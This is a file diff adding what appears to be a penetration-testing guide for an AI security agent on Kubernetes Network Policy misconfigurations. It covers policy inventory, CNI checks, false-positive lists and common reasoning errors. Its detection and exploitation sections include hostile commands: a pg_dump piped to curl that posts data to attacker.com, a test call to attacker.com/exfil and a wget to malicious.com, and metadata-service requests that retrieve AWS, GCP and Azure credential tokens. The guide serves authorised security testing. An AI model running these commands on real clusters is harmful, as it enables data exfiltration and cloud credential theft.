@@ -1,0 +1,411 @@
+<network_policies_guide>
+<title>KUBERNETES NETWORK POLICY MISCONFIGURATIONS</title>
+
+<critical>Missing or misconfigured Kubernetes Network Policies allow unrestricted pod-to-pod communication, enabling lateral movement after initial compromise. Without network segmentation, an attacker with access to one pod can reach any other pod in the cluster, access databases, steal secrets, and pivot to critical workloads.</critical>
+
+<scope>
+- Missing Network Policies: Namespaces without any ingress/egress restrictions
+- Overly permissive policies: Policies that allow all traffic despite existing
+- Namespace isolation failures: Cross-namespace access without business need
+- Egress restrictions: Pods with unrestricted outbound internet access
+- Database exposure: Databases accessible from untrusted workloads
+- Ingress gaps: Policies missing for specific ports or protocols
+- CNI limitations: Network policies not enforced by CNI plugin
+</scope>
+
+<methodology>
+1. Identify CNI plugin and verify Network Policy support.
+2. List namespaces and their Network Policies.
+3. Check for default-deny policies.
+4. Test pod-to-pod connectivity across namespaces.
+5. Verify egress restrictions.
+6. Map network access to security requirements.
+7. Document excessive access paths.
+</methodology>
+
+<discovery_techniques>
+<inventory_policies>
+List Network Policies:
+```bash
+# List all network policies in cluster
+kubectl get networkpolicies --all-namespaces
+
+# Check for namespaces WITHOUT policies
+for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
+    count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
+    if [ "$count" -eq "0" ]; then
+        echo "NO POLICIES: $ns"
+    fi
+done
+
+# Describe policies in detail
+kubectl describe networkpolicy -n namespace policy-name
+```
+
+Check CNI support:
+```bash
+# Identify CNI plugin
+kubectl get pods -n kube-system | grep -E "calico|cilium|weave|flannel|canal"
+
+# Verify Network Policy enforcement
+# Flannel: Does NOT support NetworkPolicy
+# Calico: Supports NetworkPolicy
+# Cilium: Supports NetworkPolicy + more
+# Canal: Supports NetworkPolicy
+```
+</inventory_policies>
+
+<analyze_policies>
+Check policy effectiveness:
+```yaml
+# INEFFECTIVE - Empty selector matches nothing
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: ineffective-policy
+spec:
+  podSelector: {}  # Selects all pods
+  policyTypes:
+  - Ingress
+  ingress: []  # Empty rules = deny all (this IS effective)
+
+# OVERLY PERMISSIVE - Allows everything
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-all
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+  ingress:
+  - {}  # Allow all ingress
+  egress:
+  - {}  # Allow all egress
+```
+
+Analyze existing policies:
+```bash
+# Get policy YAML
+kubectl get networkpolicy -n namespace policy-name -o yaml
+
+# Look for:
+# - podSelector: {} with empty ingress (deny all - good)
+# - ingress: [{}] (allow all - bad)
+# - Missing egress rules (no egress restriction)
+# - namespaceSelector: {} (allows all namespaces)
+```
+</analyze_policies>
+
+<test_connectivity>
+From a test pod, check reachability:
+```bash
+# Deploy a test pod
+kubectl run nettest --image=nicolaka/netshoot --rm -it -- bash
+
+# Test connectivity to other pods/services
+curl -v http://database-service.database-ns:5432
+nc -zv 10.0.0.1 443
+nmap -sT -p 1-65535 target-service
+
+# Test cross-namespace
+curl http://service.other-namespace.svc.cluster.local
+
+# Test egress to internet
+curl https://example.com
+```
+
+Systematic testing:
+```bash
+# From compromised/test pod, enumerate reachable services
+for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
+    for svc in $(kubectl get svc -n $ns -o jsonpath='{.items[*].metadata.name}'); do
+        nc -zv -w 1 $svc.$ns.svc.cluster.local 80 2>/dev/null && echo "REACHABLE: $svc.$ns"
+    done
+done
+```
+</test_connectivity>
+
+<egress_analysis>
+Check egress restrictions:
+```bash
+# From pod, test outbound access
+curl -v https://api.external.com
+wget http://malicious.com/beacon
+
+# Check if pod can reach metadata service
+curl http://169.254.169.254/latest/meta-data/  # AWS
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/  # GCP
+curl -H "Metadata: true" http://169.254.169.254/metadata/instance  # Azure
+```
+
+Missing egress policy indicators:
+- Pod can reach internet without business need
+- Pod can reach cloud metadata service
+- Pod can reach internal services it shouldn't need
+</egress_analysis>
+</discovery_techniques>
+
+<vulnerability_types>
+<no_network_policies>
+Risk: Any pod can communicate with any other pod
+Attack scenario:
+1. Attacker compromises web frontend pod (via app vulnerability)
+2. From frontend, scan internal network
+3. Discover and connect to database pod directly
+4. Exfiltrate data bypassing application controls
+
+Detection:
+```bash
+kubectl get networkpolicies -n production
+# No resources found = VULNERABLE
+```
+</no_network_policies>
+
+<cross_namespace_access>
+Risk: Pods in one namespace can access sensitive namespaces
+Attack scenario:
+1. Compromise pod in development namespace
+2. Access production database service
+3. Steal production data from development compromise
+
+Detection:
+```bash
+# From pod in dev namespace
+curl http://database.production.svc.cluster.local:5432
+# If successful, cross-namespace access unrestricted
+```
+</cross_namespace_access>
+
+<unrestricted_egress>
+Risk: Compromised pods can exfiltrate data or download malware
+Attack scenario:
+1. Compromise pod via application vulnerability
+2. Download additional tools from internet
+3. Exfiltrate stolen data to attacker server
+4. Establish reverse shell for persistence
+
+Detection:
+```bash
+# From pod
+curl https://attacker.com/exfil?data=stolen
+# If successful, egress unrestricted
+```
+</unrestricted_egress>
+
+<database_exposure>
+Risk: Database directly accessible from untrusted workloads
+Attack scenario:
+1. Compromise any pod in cluster
+2. Connect directly to database (bypass app authentication)
+3. Dump database contents
+4. Modify data directly
+
+Detection:
+```bash
+# From random pod
+nc -zv postgres.database-ns.svc.cluster.local 5432
+mysql -h mysql.database-ns.svc.cluster.local -u root -p
+```
+</database_exposure>
+
+<cni_not_enforcing>
+Risk: NetworkPolicies exist but aren't enforced
+Attack scenario:
+1. Organization believes policies protect sensitive workloads
+2. CNI plugin (e.g., Flannel) doesn't support NetworkPolicy
+3. All traffic actually flows freely despite policies
+4. False sense of security
+
+Detection:
+```bash
+# Check CNI
+kubectl get pods -n kube-system | grep flannel
+# Flannel = NetworkPolicy NOT enforced
+
+# Test despite policy existing
+kubectl get networkpolicy -n production deny-all
+# Policy exists, but:
+curl http://protected-service.production  # Still works
+```
+</cni_not_enforcing>
+</vulnerability_types>
+
+<exploitation>
+<lateral_movement_poc>
+Proof of concept:
+1. Obtain shell in web-frontend pod (assume initial compromise)
+2. Scan internal network:
+   ```bash
+   # From compromised pod
+   for i in $(seq 1 254); do
+       timeout 1 bash -c "echo >/dev/tcp/10.0.0.$i/5432" 2>/dev/null && echo "Found: 10.0.0.$i:5432"
+   done
+   ```
+3. Connect to discovered database:
+   ```bash
+   psql -h 10.0.0.42 -U app -d production
+   ```
+4. Exfiltrate data:
+   ```bash
+   pg_dump -h 10.0.0.42 | curl -X POST -d @- https://attacker.com/collect
+   ```
+
+Evidence:
+- Screenshot/log of scan from frontend pod
+- Database connection successful
+- Data retrieval demonstrated
+</lateral_movement_poc>
+
+<metadata_access>
+From pod without egress restrictions:
+```bash
+# AWS
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+Impact: Credentials for cloud provider, potential full cloud compromise
+</metadata_access>
+</exploitation>
+
+<validation>
+1. Verify CNI supports Network Policies (not Flannel without Calico).
+2. Demonstrate actual connectivity between pods that shouldn't communicate.
+3. Show sensitive data/services reachable (not just any connectivity).
+4. Document the attack path: entry point → lateral movement → target.
+5. Verify this is production, not development/test with intentional openness.
+6. Check for non-Kubernetes network controls (security groups, firewalls).
+7. Confirm the business requirement doesn't justify the access.
+</validation>
+
+<false_positives>
+- Connectivity required for legitimate service mesh
+- Namespaces intentionally sharing access (same team/application)
+- Development clusters with relaxed policies by design
+- CNI-level or cloud firewall rules providing segmentation
+- Service mesh (Istio, Linkerd) handling authorization separately
+- Policies present but testing from wrong source pod
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. CNI NOT CHECKED:
+   WRONG: "No Network Policies found, lateral movement possible"
+   RIGHT: Must verify CNI supports Network Policies:
+          - Flannel alone does NOT enforce policies
+          - AWS VPC CNI needs configuration
+          - Some managed Kubernetes has default policies
+          Check CNI BEFORE claiming policies are missing.
+
+2. SERVICE MESH OVERSIGHT:
+   WRONG: "No Kubernetes Network Policy, network unsegmented"
+   RIGHT: Service mesh may handle authorization:
+          - Istio AuthorizationPolicy
+          - Linkerd authorization policies
+          - These operate at L7, not L3/L4
+          Check for service mesh policies.
+
+3. INTENDED ACCESS:
+   WRONG: "Frontend can reach backend, lateral movement risk"
+   RIGHT: Some connectivity is required:
+          - Frontend MUST reach backend API
+          - Backend MUST reach database
+          - Services within same app need access
+          Focus on UNINTENDED cross-boundary access.
+
+4. DEVELOPMENT ENVIRONMENT:
+   WRONG: "Dev cluster has no network policies, critical finding"
+   RIGHT: Development environments often relax security:
+          - Faster iteration without policy management
+          - No sensitive data present
+          - Isolated from production
+          Verify finding applies to production.
+
+5. CLOUD-LEVEL CONTROLS:
+   WRONG: "K8s has no policies, any pod can reach database"
+   RIGHT: Cloud-level controls may exist:
+          - Security groups restricting traffic
+          - VPC network ACLs
+          - PrivateLink/VPC Endpoints
+          Check for compensating controls.
+
+6. EGRESS TO LEGITIMATE SERVICES:
+   WRONG: "Pod can reach internet, unrestricted egress"
+   RIGHT: Some egress is required:
+          - Third-party API calls
+          - External service integrations
+          - Software updates (if approved)
+          Focus on egress to UNTRUSTED destinations.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. INTENDED ARCHITECTURE:
+   - Pods in same deployment needing communication
+   - Frontend to backend connectivity
+   - Backend to database access
+   - Sidecar proxy communication (envoy, etc.)
+
+2. ALTERNATIVE CONTROLS:
+   - Istio/Linkerd authorization policies
+   - AWS security groups on node level
+   - GKE Dataplane V2 with automatic policies
+   - Azure NSGs protecting subnets
+
+3. DEVELOPMENT/TEST:
+   - Non-production clusters
+   - CI/CD testing environments
+   - Local development clusters (minikube, kind)
+
+4. CNI LIMITATIONS ACCEPTED:
+   - Flannel chosen for simplicity with other controls
+   - Managed Kubernetes with provider-level isolation
+   - Air-gapped clusters with physical isolation
+
+5. EGRESS REQUIREMENTS:
+   - Integration with external APIs
+   - Webhook callbacks
+   - Monitoring/logging services
+   - Legitimate internet access needs
+
+6. NAMESPACE SHARING:
+   - Same application spanning namespaces
+   - Shared services (logging, monitoring)
+   - Multi-tenant but same trust level
+</expanded_false_positives>
+
+<impact>
+- Lateral movement: Attacker pivots from initial foothold to critical systems
+- Data exfiltration: Direct database access bypasses application controls
+- Credential theft: Access to secrets in other namespaces
+- Service disruption: Attacker modifies or disrupts other workloads
+- Compliance violation: PCI DSS, SOC2 require network segmentation
+- Privilege escalation: Access to privileged pods from unprivileged ones
+- Cloud compromise: Metadata service access leads to cloud credentials
+</impact>
+
+<pro_tips>
+1. Always verify CNI first: `kubectl get pods -n kube-system | grep -E "calico|cilium"`.
+2. Default deny policy should be first: `spec.podSelector: {}` with no ingress rules.
+3. Test FROM the perspective of a compromised pod, not the cluster admin.
+4. Egress to 169.254.169.254 (metadata) should always be blocked unless required.
+5. Database namespaces should have strict ingress policies.
+6. Consider Cilium for L7 policies (HTTP path-based, etc.).
+7. Network policy generator tools can help create policies from observed traffic.
+8. Check if policies use podSelector vs namespaceSelector correctly.
+9. Istio sidecar injection may affect network policy behavior.
+10. Document which services SHOULD be able to communicate for policy design.
+</pro_tips>
+
+<remember>Network Policy vulnerabilities require verifying that the CNI actually enforces policies, then demonstrating connectivity between workloads that shouldn't communicate. Legitimate service-to-service communication (frontend→backend→database) is expected. Focus on cross-boundary access, unrestricted egress to untrusted destinations, and exposure of sensitive services like databases.</remember>
+</network_policies_guide>
